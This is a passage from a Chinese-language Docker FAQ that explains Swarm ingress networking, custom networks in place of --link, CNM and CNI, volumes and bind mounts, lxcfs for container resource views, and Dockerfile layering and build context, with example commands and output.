报错信息不再说网络找不到，而是说这个 mynet 网络无法连接。这是由于从 1.13 开始，允许在建立网络的时候声明这个网络是否可以被零散的容器所连接。如果 docker network create 加了 --attachable 的参数，那么在后期，这个网络是可以被普通容器所连接的。 但是这是在安全模型上开了一个口子，因此，默认不允许普通容器链接，并且不建议使用。 问：使用 Swarm Mode 的时，看到有个叫 ingress 的 overlay 网络，它和自己创建的网络有什么区别？答： 在启用了二代 Swarm 后，可能会在网络列表时看到一个名为 ingress 的 overlay 网络。 12345678$ docker network lsNETWORK ID NAME DRIVER SCOPE6beb824623a4 bridge bridge localf3f636574c7a docker_gwbridge bridge localcfeb2513a4a3 host host local88smbt683r5p ingress overlay swarm24pz359114y0 mynet overlay swarmd35d69ece740 none null local 这里可以看到两个 overlay 网络，其中一个是我们创建的 mynet，另一个则是 Docker 引擎自己创建的 ingress，从驱动和 Scope 可以看出两个网络都是给 Swarm Mode 使用的 overlay 网络。 ingress 是 overlay 网络，但并不是普通的 overlay network，它是为边界进入流量特殊准备的网络。这个网络存在于集群中每一个Docker宿主上，不需要额外建立。 当我们使用 docker service create -p 80:80 这种形式创建一个服务的时候，我们要求映射集群端口 80 到服务容器的 80 端口上。其效果是访问任一节点的 80 端口，即使这个节点没有运行我们所需的容器，依旧可以连接到容器服务，并且取得结果。实现这样效果的一个原因就是因为 ingress 网络的存在。 Swarm 中的每个节点，都会有一个隐藏的沙箱容器监听宿主的服务端口，用于接收来自集群外界的访问。 我们可以通过 docker network inspect ingress 来看到这个沙箱容器： 1234567891011121314151617181920212223242526272829303132333435363738394041$ docker network inspect ingress[ &#123; "Name": "ingress", "Id": "88smbt683r5p7c0l7sd0dpniw", "Scope": "swarm", "Driver": "overlay", "EnableIPv6": false, "IPAM": &#123; "Driver": "default", "Options": null, "Config": [ &#123; "Subnet": "10.255.0.0/16", "Gateway": "10.255.0.1" &#125; ] &#125;, "Internal": false, "Containers": &#123; "faff08692b5f916fcb15aa7ac6bc8633a0fa714a52a1fb75e57525c94581c45a": &#123; "Name": "web.1.1jyunyva6picwsztzrj6t2cio", "EndpointID": "58240770eb25565b472384731b1b90e36141a633ce184a5163829cf96e9d1195", "MacAddress": "02:42:0a:ff:00:05", "IPv4Address": "10.255.0.5/16", "IPv6Address": "" &#125;, "ingress-sbox": &#123; "Name": "ingress-endpoint", "EndpointID": "fe8f89d4f99d7bacb14c5cb723682c180278d62e9edd10b523cdd81a45695c5d", "MacAddress": "02:42:0a:ff:00:03", "IPv4Address": "10.255.0.3/16", "IPv6Address": "" &#125; &#125;, "Options": &#123; "com.docker.network.driver.overlay.vxlanid_list": "256" &#125;, "Labels": &#123;&#125; &#125;] 在上面的命令返回信息中，我们可以看到一个名为 ingress-endpoint 的容器，这就是边界沙箱容器。 当我们创建服务时，使用了 -p 参数后，服务容器就会被自动的加入到 ingress网络中，同时会在沙箱中注册映射信息，告知哪个服务要求守护哪个端口，具体对应容器是哪些。 因此当沙箱收到外部连接后，通过访问端口就可以知道具体服务在守护，然后会通过这个 ingress 网络去将连接请求转发给对应服务容器。而由于 ingress 的本质是 overlay network，因此，无论服务容器运行于哪个节点上，沙箱都可以成功的将连接转发给正确的服务容器。 所以，ingress 是特殊用途的网络，只要服务有-p选项，那么服务容器就会自动被加入该网络。因此把 ingress 网络当做普通的 overlay网络使用的话，除了会干扰 Swarm 正常的边界负载均衡的能力，也会破坏服务隔离的安全机制。所以不要把这个网络当做普通的 overlay网络来使用，需要控制服务互联和隔离时，请用自行创建的 overlay 网络。 问：听说 –link 过时不再用了？那容器互联、服务发现怎么办？答： 在 1-2 年前，Docker 所有容器都连接于默认的桥接网络上，也就是很多老文章鼓捣的 docker0桥接网卡。因此实际上默认情况下所有容器都是可以互联的，没有隔离，当然这样安全性不好。而服务发现，是在这种环境下发展出来的，通过修改容器内的 /etc/hosts文件来完成的。凡是 --link 的主机的别名就会出现于 /etc/hosts 中，其地址由 Docker 引擎维护。因此容器间才可以通过别名互访。 但是这种办法并不是好的解决方案，Docker 早在一年多以前就已经使用自定义网络了。在同一个网络中的容器，可以互联，并且，Docker 内置了 DNS，容器内的应用可以使用服务名、容器名、别名来进行服务发现，名称会经由内置的 DNS 进行解析，其结果是动态的；而不在同一网络中的容器，不可以互联。 因此，现在早就不用 --link 了，而且非常不建议使用。 首先是因为使用 --link 就很可能还在用默认桥接网络，这很不安全，所有容器都没有适度隔离，用自定义网络才比较方便互联隔离。 其次，修改 /etc/hosts 文件有很多弊病。比如，高频繁的容器启停环境时，容易产生竞争冒险，导致 /etc/hosts 文件损坏，出现访问故障；或者有些应用发现是来自于 /etc/hosts 文件后，就假定其为静态文件，而缓存结果不再查询，从而导致容器启停 IP 变更后，使用旧的条目而无法连接到正确的容器等等。 另外，在一代 Swarm 环境中，在 docker-compose.yml 中使用了 links就意味着服务间的强依赖关系，因此调度时不会将服务运行于不同节点，而是全部运行于一个节点，使得横向扩展失败。 所以不要再使用 --link 以及 docker-compose.yml 中的 links 了。应该使用 docker network，建立网络，而 docker run --network 来连接特定网络。或者使用 version: &#39;2&#39; 的 docker-compose.yml 直接定义自定义网络并使用。 问：CNM和CNI分别是啥东东？答： 目前关于Linux容器网络接口的配置有两种的可能的标准：容器网络模型（CNM）和容器网络接口（CNI）。网络是相当复杂的，而且提供某种功能的方式也多种多样。 CNM是一个被 Docker 公司提出的规范。现在已经被Cisco Contiv,Kuryr, Open Virtual Networking (OVN), Project Calico, VMware 和 Weave这些公司和项目所采纳。 CNI是由CoreOS提出的一个容器网络规范。已采纳改规范的包括Apache Mesos, Cloud Foundry, Kubernetes, Kurma 和 rkt。另外 Contiv Networking, Project Calico 和 Weave这些项目也为CNI提供插件。 这两种方案都使用了驱动模型或者插件模型来为容器创建网络栈。这样的设计使得用户可以自由选择。两者都支持多个网络驱动被同时使用，也允许容器加入一个或多个网络。两者也都允许容器runtime在它自己的命名空间中启动网络。 CNM 模式下的网络驱动不能访问容器的网络命名空间。这样做的好处是libnetwork可以为冲突解决提供仲裁。一个例子是：两个独立的网络驱动提供同样的静态路由配置，但是却指向不同的下一跳IP地址。与此不同，CNI允许驱动访问容器的网络命名空间。CNI正在研究在类似情况下如何提供仲裁。 CNI支持与第三方IPAM的集成，可以用于任何容器runtime。CNM从设计上就仅仅支持Docker。由于CNI简单的设计，许多人认为编写CNI插件会比编写CNM插件来得简单。 CNI官方网络插件 地址： https://github.com/containernetworking/cni 所有的标准和协议都要有具体的实现，才能够被大家使用。CNI 也不例外，目前官方在 github 上维护了同名的 CNI代码库，里面已经有很多可以直接拿来使用的 CNI插件。 官方提供的插件目前分成三类：main、meta 和 ipam。main 是主要的实现了某种特定网络功能的插件；meta 本身并不会提供具体的网络功能，它会调用其他插件，或者单纯是为了测试；ipam 是分配 IP 地址的插件。ipam 并不提供某种网络功能，只是为了灵活性把它单独抽象出来，这样不同的网络插件可以根据需求选择 ipam，或者实现自己的 ipam。 这些插件的功能详细说明如下： main– loopback：这个插件很简单，负责生成 lo 网卡，并配置上 127.0.0.1/8 地址– bridge：和 docker 默认的网络模型很像，把所有的容器连接到虚拟交换机上– macvlan：使用 macvlan 技术，从某个物理网卡虚拟出多个虚拟网卡，它们有独立的 ip 和 mac 地址– ipvlan：和 macvlan 类似，区别是虚拟网卡有着相同的 mac 地址– ptp：通过 veth pair 在容器和主机之间建立通道 meta– flannel：结合 bridge 插件使用，根据 flannel 分配的网段信息，调用 bridge 插件，保证多主机情况下容器 ipam– host-local：基于本地文件的 ip 分配和管理，把分配的 IP 地址保存在文件中– dhcp：从已经运行的 DHCP 服务器中获取 ip 地址 问：容器怎么取宿主机 IP 啊？答： 单机环境 如果是单机环境，很简单，不必琢磨怎么突破命名空间限制，直接用环境变量送进去即可。 docker run -d -e HOST_IP=&lt;宿主的IP地址&gt; nginx 然后容器内直接读取HOST_IP环境变量即可。 集群环境 集群环境相对比较复杂，docker service create 中的 -e 以及 --env-file是在服务创建时指定、读取环境变量内容，而不是运行时，因此对于每个节点都是一样的。而且目前不存在 dockerd -e 选项，所以直接使用这些选项达不到我们想要的效果。 不过有变通的办法，可以在宿主上建立一个 /etc/variables 文件（名字随意，这里用这个文件举例）。其内容为： 1HOST_IP=1.2.3.4 其中 1.2.3.4 是这个节点的宿主 IP，因此每个节点的 /etc/variables 的内容不同。 而在启动服务时，指定挂载这个服务端本地文件： 123docker service create --name app \ --mount type=bind,source=/etc/variables,target=/etc/variables:ro \ myapp 由于 --mount 是发生于容器运行时，因此所加载的是所运行的服务器的 /etc/variables，里面所包含的也是该服务器的 IP 地址。 在 myapp 这个镜像的入口脚本加入加载该环境变量文件的命令： 1source /etc/variables 这样 app 这个服务容器就会拥有 HOST_IP 环境变量，其值为所运行的宿主 IP。 问：容器磁盘可以限制配额么？答： 对于 devicemapper, btrfs, zfs 来说，可以通过 --storage-opt size=100G这种形式限制 rootfs 的大小。 docker create -it --storage-opt size=120G fedora /bin/bash 参考官网文档： https://docs.docker.com/engine/reference/commandline/run/#/set-storage-driver-options-per-container 问：我在容器里面看到的内存使用量是真实的该容器内存使用情况？答： 不是的，众所周知，Docker相比于虚拟机，在隔离性上略显不足，这个Docker隔离性不足导致资源显示问题。进入容器看到是完整的物理机资源。虽然 Docker原生的资源查询接口可以正确地识别分配的资源，但是用户常用的 top、free等命令却未能正确地识别我们施加于 Docker的资源限制，那么原因究竟是怎样。事实上，类似 top、free等命令，其实多半都是从一些系统文件中获取资源信息,/proc/cpuinfo,/proc/meminfo而 Docker的隔离性不足的问题里，就包括跟宿主机共享 sys、proc等系统文件，因此如果在容器中使用依赖这些文件的命令，如 uptime等，实际上都显示的是宿主机信息。 容器的显示问题，在很早期的版本中就有人提出过。而 Docker官方可能是出于某些原因的考虑，并没有试图修复这些显示问题。目前来说，解决显示问题还没办法很好地在 Docker中进行集成，仍然需要在 Docker之外做一些修改。 目前社区中常见的做法是利用 lxcfs来提供容器中的资源可见性。lxcfs 是一个开源的FUSE（用户态文件系统）实现来支持LXC容器，它也可以支持Docker容器。 LXCFS通过用户态文件系统，在容器中提供下列procfs 的文件。 123456/proc/cpuinfo/proc/diskstats/proc/meminfo/proc/stat/proc/swaps/proc/uptime 容器中进程读取相应文件内容时，LXCFS的FUSE实现会从容器对应的Cgroup中读取正确的内存限制。从而使得应用获得正确的资源约束设定。 使用方法： 安装 lxcfs 的RPM包 12$ wget https://copr-be.cloud.fedoraproject.org/results/ganto/lxd/epel-7-x86_64/00486278-lxcfs/lxcfs-2.0.5-3.el7.centos.x86_64.rpm$ yum install lxcfs-2.0.5-3.el7.centos.x86_64.rpm 启动 lxcfs 12$ mkdir -p /var/lib/lxcfs$ lxcfs /var/lib/lxcfs &amp; 运行Docker容器测试 12345678910111213141516171819$ docker run -it -m 300m \ -v /var/lib/lxcfs/proc/cpuinfo:/proc/cpuinfo:rw \ -v /var/lib/lxcfs/proc/diskstats:/proc/diskstats:rw \ -v /var/lib/lxcfs/proc/meminfo:/proc/meminfo:rw \ -v /var/lib/lxcfs/proc/stat:/proc/stat:rw \ -v /var/lib/lxcfs/proc/swaps:/proc/swaps:rw \ -v /var/lib/lxcfs/proc/uptime:/proc/uptime:rw \ centos:7 /bin/bash[root@e851562db40d /]# free -m total used free shared buff/cache availableMem: 300 3 295 29 0 295Swap: 300 0 300[root@e851562db40d /]# cat /proc/meminfoMemTotal: 307200 kBMemFree: 302768 kBMemAvailable: 302768 kBBuffers: 0 kB....................... 我们可以看到MemTotal的内存为300MB，配置已经生效。 官方项目地址： https://github.com/lxc/lxcfs 问：数据容器、数据卷、命名卷、匿名卷、挂载目录这些都有什么区别？答： 首先，挂载分为挂载本地宿主目录 和 挂载数据卷(Volume)。而数据卷又分为匿名数据卷和命名数据卷。 绑定宿主目录的概念很容易理解，就是将宿主目录绑定到容器中的某个目录位置。这样容器可以直接访问宿主目录的文件。其形式是 1docker run -d -v /var/www:/app nginx 这里注意到 -v 的参数中，前半部分是绝对路径。在 docker run 中必须是绝对路径，而在 docker-compose 中，可以是相对路径，因为 docker-compose会帮你补全路径。 另一种形式是使用 Docker Volume，也就是数据卷。这是很多看古董书的人不了解的概念，不要跟数据容器（Data Container）弄混。数据卷是 Docker 引擎维护的存储方式，使用 docker volume create 命令创建，可以利用卷驱动支持多种存储方案。其默认的驱动为 local，也就是本地卷驱动。本地驱动支持命名卷和匿名卷。 顾名思义，命名卷就是有名字的卷，使用 docker volume create --name xxx 形式创建并命名的卷；而匿名卷就是没名字的卷，一般是 docker run -v /data这种不指定卷名的时候所产生，或者 Dockerfile 里面的定义直接使用的。 有名字的卷，在用过一次后，以后挂载容器的时候还可以使用，因为有名字可以指定。所以一般需要保存的数据使用命名卷保存。 而匿名卷则是随着容器建立而建立，随着容器消亡而淹没于卷列表中（对于 docker run 匿名卷不会被自动删除）。对于二代 Swarm 服务而言，匿名卷会随着服务删除而自动删除。 因此匿名卷只存放无关紧要的临时数据，随着容器消亡，这些数据将失去存在的意义。 此外，还有一个叫数据容器 (Data Container) 的概念，也就是使用--volumes-from的东西。这早就不用了，如果看了书还在说这种方式，那说明书已经过时了。按照今天的理解，这类数据容器，无非就是挂了个匿名卷的容器罢了。 在 Dockerfile 中定义的挂载，是指 匿名数据卷。Dockerfile 中指定 VOLUME 的目的，只是为了将某个路径确定为卷。 我们知道，按照最佳实践的要求，不应该在容器存储层内进行数据写入操作，所有写入应该使用卷。如果定制镜像的时候，就可以确定某些目录会发生频繁大量的读写操作，那么为了避免在运行时由于用户疏忽而忘记指定卷，导致容器发生存储层写入的问题，就可以在 Dockerfile 中使用VOLUME来指定某些目录为匿名卷。这样即使用户忘记了指定卷，也不会产生不良的后果。 这个设置可以在运行时覆盖。通过 docker run 的 -v参数或者 docker-compose.yml 的 volumes 指定。使用命名卷的好处是可以复用，其它容器可以通过这个命名数据卷的名字来指定挂载，共享其内容（不过要注意并发访问的竞争问题）。 比如，Dockerfile 中说 VOLUME /data，那么如果直接 docker run，其 /data 就会被挂载为匿名卷，向 /data写入的操作不会写入到容器存储层，而是写入到了匿名卷中。但是如果运行时 docker run -v mydata:/data，这就覆盖了 /data 的挂载设置，要求将 /data 挂载到名为 mydata 的命名卷中。所以说 Dockerfile 中的 VOLUME 实际上是一层保险，确保镜像运行可以更好的遵循最佳实践，不向容器存储层内进行写入操作。 数据卷默认可能会保存于/var/lib/docker/volumes，不过一般不需要、也不应该访问这个位置。 问：卷和挂载目录有什么区别？答： 卷 (Docker Volume) 是受控存储，是由 Docker 引擎进行管理维护的。因此使用卷，你可以不必处理 uid、SELinux 等各种权限问题，Docker 引擎在建立卷时会自动添加安全规则，以及根据挂载点调整权限。并且可以统一列表、添加、删除。另外，除了本地卷外，还支持网络卷、分布式卷。 而挂载目录那就没人管了，属于用户自行维护。你就必须手动处理所有权限问题。特别是在 CentOS 上，很多人碰到 Permission Denied，就是因为没有使用卷，而是挂载目录，而且还对 SELinux 安全权限一无所知导致。 问：为什么绑定了宿主的文件到容器，宿主修改了文件，容器内看到的还是旧的内容啊？答： 在绑定宿主内容的形式中，有一种特殊的形式，就是绑定宿主文件，既： 1docker run -d -v $PWD/myapp.ini:/app/app.ini myapp 在 myapp.ini 文件不发生改变的情况下，这样的绑定是和绑定宿主目录性质一样，同样是将宿主文件绑定到容器内部，容器内可以看到这个文件。但是，一旦文件发生改变，情况则有不同。 简单的文件修改，比如 echo &quot;name = jessie&quot; &gt;&gt; myapp.ini，这类修改依旧还是原来的文件，宿主（或容器）对文件进行的改动，另一方是可以看到的。 而复杂的文件操作，比如使用 vim，或者其它编辑器编辑文件，则很有可能会导致一方的修改，另一方看不到。 其原因是这类编辑器在保存文件的时候，经常会采用一种避免写入过程中发生故障而导致文件丢失的策略，既先把内容写到一个新的文件中去，写好了后，再删除旧的文件，然后把新文件改名为旧的文件名，从而完成保存的操作。从这个操作流程可以看出，虽然修改后的文件的名字和过去一样，但对于文件系统而言是一个新的文件了。换句话说，虽然是同名文件，但是旧的文件的 inode 和修改后的文件的 inode 不同。 12345$ ls -i268541 hello.txt$ vi hello.txt$ ls -i268716 hello.txt 如上面的例子可以看到，经过 vim 编辑文件后，inode 从 268541 变为了 268716，这就是刚才说的，名字还是那个名字，文件已不是原来的文件了。 而 Docker 的 绑定宿主文件，实际上在文件系统眼里，针对的是 inode，而不是文件名。因此容器内所看到的，依旧是之前旧的 inode 对应的那个文件，也就是旧的内容。 这就出现了之前的那个问题，在宿主内修改绑定文件的内容，结果发现容器内看不到改变，其原因就在于宿主的那个文件已不是原来的文件了。 这类问题解决办法很简单，如果文件可能改变，那么就不要绑定宿主文件，而是绑定一个宿主目录，这样只要目录不跑，里面文件爱咋改就咋改。 问：多个 Docker 容器之间共享数据怎么办？答： 如果是不同宿主，则可以使用分布式数据卷驱动，让分布在不同宿主的容器都可以访问到的分布式存储的位置。如S3之类： https://docs.docker.com/engine/extend/legacy_plugins/#authorization-plugins 问：既然一个容器一个应用，那么我想在该容器中用计划任务 cron 怎么办？答： cron 其实是另一个服务了，所以应该另起一个容器来进行，如需访问该应用的数据文件，那么可以共享该应用的数据卷即可。而 cron 的容器中，cron 以前台运行即可。 比如，我们希望有个 python 脚本可以定时执行。那么可以这样构建这个容器。 首先基于 python 的镜像定制： 1234567FROM python:3.5.2ENV TZ=Asia/ShanghaiRUN apt-get update \ &amp;&amp; apt-get install -y cron \ &amp;&amp; apt-get autoremove -yCOPY ./cronpy /etc/cron.d/cronpyCMD ["cron", "-f"] 中所提及的 cronpy 就是我们需要计划执行的 cron 脚本。 1* * * * * root /app/task.py &gt;&gt; /var/log/task.log 2&gt;&amp;1 在这个计划中，我们希望定时执行 /app/task.py 文件，日志记录在/var/log/task.log 中。这个 task.py 是一个非常简单的文件，其内容只是输出个时间而已。 123#!/usr/local/bin/pythonfrom datetime import datetimeprint ("Cron job has run at &#123;0&#125; with environment variable ".format(str(datetime.now()))) 这 task.py 可以在构建镜像时放进去，也可以挂载宿主目录。在这里，我以挂载宿主目录举例。 123456789# 构建镜像docker build -t cronjob:latest .# 运行镜像docker run \ --name cronjob \ -d \ -v $(pwd)/task.py:/app/task.py \ -v $(pwd)/log/:/var/log/ \ cronjob:latest 需要注意的是，应该在构建主机上赋予 task.py 文件可执行权限。 问：为什么说数据库不适合放在 Docker 容器里运行？答： 不为什么，因为这个说法不对，大部分认为数据库必须放到容器外运行的人根本不知道 Docker Volume 为何物。 在早年 Docker 没有 Docker Volume 的时候，其数据持久化是一个问题，但是这已经很多年过去了。现在有 Docker Volume解决持久化问题，从本地目录绑定、受控存储空间、块设备、网络存储到分布式存储，Docker Volume 都支持，不存在数据读写类的服务不适于运行于容器内的说法。 Docker 不是虚拟机，使用数据卷是直接向宿主写入文件，不存在性能损耗。而且卷的生存周期独立于容器，容器消亡卷不消亡，重新运行容器可以挂载指定命名卷，数据依然存在，也不存在无法持久化的问题。 建议去阅读一下官方文档： https://docs.docker.com/engine/tutorials/dockervolumes/ https://docs.docker.com/engine/reference/commandline/volume_create/ https://docs.docker.com/engine/extend/legacy_plugins/#/volume-plugins 问：如何列出容器和所使用的卷的关系？答： 要感谢强大的 Go Template，可以使用下面的命令来显示： 12docker inspect --format '&#123;&#123;.Name&#125;&#125; =&gt; &#123;&#123;with .Mounts&#125;&#125;&#123;&#123;range .&#125;&#125; &#123;&#123;.Name&#125;&#125;,&#123;&#123;end&#125;&#125;&#123;&#123;end&#125;&#125;' $(docker ps -aq) 注意这里的换行和空格是有意如此的，这样就可以再返回结果控制缩进格式。其结果将是如下形式： 1234567891011$ docker inspect --format '&#123;&#123;.Name&#125;&#125; =&gt; &#123;&#123;with .Mounts&#125;&#125;&#123;&#123;range .&#125;&#125; &#123;&#123;.Name&#125;&#125;&#123;&#123;end&#125;&#125;&#123;&#123;end&#125;&#125;' $(docker ps -aq)/device_api_1 =&gt;/device_dashboard-debug_1 =&gt;/device_redis_1 =&gt; device_redis-data/device_mongo_1 =&gt; device_mongo-data 61453e46c3409f42e938324d7feffc6aeb6b7ce16d2080566e3b128c910c9570/prometheus_prometheus_1 =&gt; fc0185ed3fc637295de810efaff7333e8ff2f6050d7f9368a22e19fb2c1e3c3f 问：docker pull 下来的镜像文件都在哪？答： Docker不是虚拟机，Docker 镜像也不是虚拟机的 ISO 文件。Docker 的镜像是分层存储，每一个镜像都是由很多层，很多个文件组成。而不同的镜像是共享相同的层的，所以这是一个树形结构，不存在具体哪个文件是 pull 下来的镜像的问题。 问：docker images 命令显示的镜像占了好大的空间，怎么办？答： 这个显示的大小是计算后的大小，要知道 docker image 是分层存储的，在1.10之前，不同镜像无法共享同一层，所以基本上确实是下载大小。但是从1.10之后，已有的层（通过SHA256来判断），不需要再下载。只需要下载变化的层。所以实际下载大小比这个数值要小。而且本地硬盘空间占用，也比docker images列出来的东西加起来小很多，很多重复的部分共享了。用以下命令可以清理旧的和未使用的Docker镜像： 12345$ docker image prune [OPTIONS] #命令用于删除未使用的映像。 如果指定了-a，还将删除任何容器未引用的所有映像。名称，简写 默认 说明--all, -a false 显示所有映像(默认隐藏中间映像)--force, -f false 不要提示确认 问：docker images -a 后显示了好多 的镜像？都是什么呀？能删么？答： 简单来说，&lt;none&gt; 就是说该镜像没有打标签。而没有打标签镜像一般分为两类，一类是依赖镜像，一类是丢了标签的镜像。 依赖镜像 Docker的镜像、容器的存储层是Union FS，分层存储结构。所以任何镜像除了最上面一层打上标签(tag)外，其它下面依赖的一层层存储也是存在的。这些镜像没有打上任何标签，所以在 docker images -a 的时候会以 &lt;none&gt; 的形式显示。注意观察一下 docker pull的每一层的sha256的校验值，然后对比一下&lt;none&gt; 中的相同校验值的镜像，它们就是依赖镜像。这些镜像不应当被删除，因为有标签镜像在依赖它们。 丢了标签的镜像 这类镜像可能本来有标签，后来丢了。原因可能很多，比如： docker pull 了一个同样标签但是新版本的镜像，于是该标签从旧版本的镜像转移到了新版本镜像上，那么旧版本的镜像上的标签就丢了； docker build 时指定的标签都是一样的，那么新构建的镜像拥有该标签，而之前构建的镜像就丢失了标签。 这类镜像被称为 dangling 虚悬镜像。这些镜像可以删除，手动删除 dangling 镜像： 1docker rmi $(docker images -aq -f "dangling=true") 问：为什么说不要使用 import, export, save, load, commit 来构建镜像？答： Docker 提供了很好的 Dockerfile 的机制来帮助定制镜像，可以直接使用Shell命令，非常方便。而且，这样制作的镜像更加透明，也容易维护，在基础镜像升级后，可以简单地重新构建一下，就可以继承基础镜像的安全维护操作。 使用 docker commit 制作的镜像被称为黑箱镜像，换句话说，就是里面进行的是黑箱操作，除本人外无人知晓。即使这个制作镜像的人，过一段时间后也不会完整的记起里面的操作。那么当有些东西需要改变时，或者因基础镜像更新而需要重新制作镜像时，会让一切变得异常困难，就如同重新安装调试配置服务器一样，失去了 Docker 的优势了。 另外，Docker 不是虚拟机，其文件系统是 Union FS，分层式存储，每一次 commit 都会建立一层，上一层的文件并不会因为 rm而删除，只是在当前层标记为删除而看不到了而已，每次 docker pull 的时候，那些不必要的文件都会如影随形，所得到的镜像也必然臃肿不堪。而且，随着文件层数的增加，不仅仅镜像更臃肿，其运行时性能也必然会受到影响。这一切都违背了 Docker 的最佳实践。 使用 commit 的场合是一些特殊环境，比如入侵后保存现场等等，这个命令不应该成为定制镜像的标准做法。所以，请用 Dockerfile 定制镜像。 import 和 export 的做法，实际上是将一个容器来保存为 tar 文件，然后在导入为镜像。这样制作的镜像同样是黑箱镜像，不应该使用。而且这类导入导出会导致原有分层丢失，合并为一层，而且会丢失很多相关镜像元数据或者配置，比如 CMD 命令就可能丢失，导致镜像无法直接启动。 save 和 load 确实是镜像保存和加载，但是这是在没有 registry 的情况下，手动把镜像考来考去，这是回到了十多年的 U 盘时代。这同样是不推荐的，镜像的发布、更新维护应该使用 registry。无论是自己架设私有 registry 服务，还是使用公有 registry 服务，如 Docker Hub。 问：Dockerfile 怎么写？答： 最直接也是最简单的办法是看官方文档。 这篇文章讲述具体 Dockerfile 的命令语法： https://docs.docker.com/engine/reference/builder/ 然后，学习一下官方的 Dockerfile 最佳实践： https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/ 最后，去 Docker Hub 学习那些官方(Official)镜像 Dockerfile 咋写的。 Dockerfile 不等于 .sh 脚本,Dockerfile 确实是描述如何构建镜像的，其中也提供了RUN这样的命令，可以运行 shell命令。但是和普通 shell 脚本还有很大的不同。 Dockerfile 描述的实际上是镜像的每一层要如何构建，所以每一个RUN是一个独立的一层。所以一定要理解“分层存储”的概念。上一层的东西不会被物理删除，而是会保留给下一层，下一层中可以指定删除这部分内容，但实际上只是这一层做的某个标记，说这个路径的东西删了。但实际上并不会去修改上一层的东西。每一层都是静态的，这也是容器本身的immutable 特性，要保持自身的静态特性。 所以很多新手会常犯下面这样的错误，把 Dockerfile 当做 shell 脚本来写了： 123456RUN yum updateRUN yum -y install gccRUN yum -y install pythonADD jdk-xxxx.tar.gz /tmpRUN cd xxxx &amp;&amp; installRUN xxx &amp;&amp; configure &amp;&amp; make &amp;&amp; make install 这是相当错误的。除了无畏的增加了很多层，而且很多运行时不需要的东西，都被装进了镜像里，比如编译环境、更新的软件包等等。结果就是产生非常臃肿、非常多层的镜像，不仅仅增加了构建部署的时间，也很容易出错。 正确的写法应该是把同一个任务的命令放到一个 RUN 下，多条命令应该用&amp;&amp; 连接，并且在最后要打扫干净所使用的环境。比如下面这段摘自官方 redis 镜像 Dockerfile的部分： 12345678910111213RUN buildDeps='gcc libc6-dev make' \ &amp;&amp; set -x \ &amp;&amp; apt-get update &amp;&amp; apt-get install -y $buildDeps --no-install-recommends \ &amp;&amp; rm -rf /var/lib/apt/lists/* \ &amp;&amp; wget -O redis.tar.gz "$REDIS_DOWNLOAD_URL" \ &amp;&amp; echo "$REDIS_DOWNLOAD_SHA1 *redis.tar.gz" | sha1sum -c - \ &amp;&amp; mkdir -p /usr/src/redis \ &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \ &amp;&amp; rm redis.tar.gz \ &amp;&amp; make -C /usr/src/redis \ &amp;&amp; make -C /usr/src/redis install \ &amp;&amp; rm -r /usr/src/redis \ &amp;&amp; apt-get purge -y --auto-remove $buildDeps 但也不能绝对的说把所有命令都合并到一个 RUN 就对，不是把所有命令都合为一个 RUN，要合理分层，以加快构建和部署。 合理分层就是将具有不同变更频繁程度的层，进行拆分，让稳定的部分在基础，更容易变更的部分在表层，使得资源可以重复利用，以增加构建和部署的速度。 以 node.js 的应用示例镜像为例，其中的复制应用和安装依赖的部分，如果都合并一起，会写成这样： 12COPY . /usr/src/appRUN npm install 但是，在 node.js 应用镜像示例中，则是这么写的： 123COPY package.json /usr/src/app/RUN npm installCOPY . /usr/src/app 从层数上看，确实多了一层。但实际上，这三行分开是故意这样做的，其目的就是合理分层，充分利用 Docker 分层存储的概念，以增加构建、部署的效率。 在 docker build 的构建过程中，如果某层之前构建过，而且该层未发生改变的情况下，那么 docker 就会直接使用缓存，不会重复构建。因此，合理分层，充分利用缓存，会显著加速构建速度。 第一行的目的是将 package.json 复制到应用目录，而不是整个应用代码目录。这样只有 pakcage.json 发生改变后，才会触发第二行 RUN npm install。而只要 package.json没有变化，那么应用的代码改变就不会引发 npm install，只会引发第三行的 COPY . /usr/src/app，从而加快构建速度。 而如果按照前面所提到的，合并为两层，那么任何代码改变，都会触发 RUN npm install，从而浪费大量的带宽和时间。 合理分层除了可以加快构建外，还可以加快部署，要知道，docker pull 的时候，是分层下载的，并且已存在的层就不会重复下载。 比如，这里的 RUN npm install 这一层，往往会几百 MB 甚至上 GB。而在 package.json 未发生变更的情况下，那么只有 COPY . /usr/src/app 这一层会被重新构建，并且也只有这一层会在各个节点 docker pull 的过程中重新下载，往往这一层的代码量只有几十 MB，甚至更小。这对于大规模的并行部署中，所节约的东西向流量是非常显著的。特别是敏捷开发环境中，代码变更的频繁度要比依赖变更的频繁度高很多，每次重复下载依赖，会导致不必要的流量和时间上的浪费。 问：context 到底是一个什么概念？答： context，上下文，是 docker build 中很重要的一个概念。构建镜像必须指定 context： 1docker build -t xxx &lt;context路径&gt; 或者 docker-compose.yml 中的 12345app: build: context: &lt;context路径&gt; dockerfile: dockerfile 这里都需要指定 context。context 是工作目录，但不要和构建镜像的Dockerfile 中的WORKDIR弄混，context 是 docker build命令的工作目录。 docker build 命令实际上是客户端，真正构建镜像并非由该命令直接完成。docker build 命令将 context 的目录上传给 Docker 引擎，由它负责制作镜像。 在 Dockerfile 中如果写 COPY ./package.json /app/这种命令，实际的意思并不是指执行 docker build 所在的目录下的 package.json，也不是指 Dockerfile 所在目录下的package.json，而是指 context 目录下的 package.json。 这就是为什么有人发现 COPY ../package.json /app 或者 COPY /opt/xxxx /app无法工作的原因，因为它们都在 context 之外，如果真正需要，应该将它们复制到 context目录下再操作。 话说，有一些网文甚至搞笑的说要把 Dockerfile放到磁盘根目录，才能构建如何如何。这都是对 context 完全不了解的表现。想象一下把整个磁盘几十个 GB当做上下文发送给 dockerd 引擎的情况。 docker build -t xxx . 中的这个.，实际上就是在指定 Context 的目录，而并非是指定 Dockerfile 所在目录。 默认情况下，如果不额外指定 Dockerfile 的话，会将 Context 下的名为 Dockerfile 的文件作为 Dockerfile。所以很多人会混淆，认为这个. 是在说 Dockerfile 的位置，其实不然。 一般项目中，Dockerfile 可能被放置于两个位置。 一个可能是放置于项目顶级目录，这样的好处是在顶级目录构建时，项目所有内容都在上下文内，方便构建； 另一个做法是，将所有 Docker 相关的内容集中于某个目录，比如 docker 目录，里面包含所有不同分支的Dockerfile，以及 docker-compose.yml类的文件、entrypoint的脚本等等。这种情况的上下文所在目录不再是 Dockerfile 所在目录了，因此需要注意指定上下文的位置。 此外，项目中可能会包含一些构建不需要的文件，这些文件不应该被发送给 dockerd 